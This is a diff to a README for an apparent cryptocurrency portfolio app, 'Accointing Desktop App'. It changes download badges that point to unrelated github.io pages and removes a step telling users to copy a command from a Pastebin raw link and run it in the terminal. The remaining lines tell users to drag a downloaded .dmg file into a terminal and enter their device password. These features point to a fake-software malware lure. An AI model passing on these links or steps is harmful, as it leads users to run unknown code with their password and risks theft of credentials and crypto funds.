@@ -10,8 +10,7 @@ Accointing Desktop App is a professional cryptocurrency portfolio tracking and t
 
 <div align="center">
   
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://avrajogoense6.github.io/.github/accointing-app)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://avrajogoense6.github.io/.github/accointing-app)
+[![View Accointing](https://img.shields.io/badge/View-Accointing-B45309?style=plastic)](https://accointing-app.github.io/.github/)
 
 </div>
 
@@ -23,14 +22,6 @@ Accointing Desktop App is a professional cryptocurrency portfolio tracking and t
 2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
 3. Open a terminal and transfer the file you extracted in the last step into it.
 4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
-
-## Installation via a command in the terminal:
-
-1. Go to the Pastebin at the link below and copy the command:
-
-https://pastebin.com/raw/XiPTN0bu
-
-2. Open your terminal, paste the command you copied earlier, and run it.
 
 ---
 
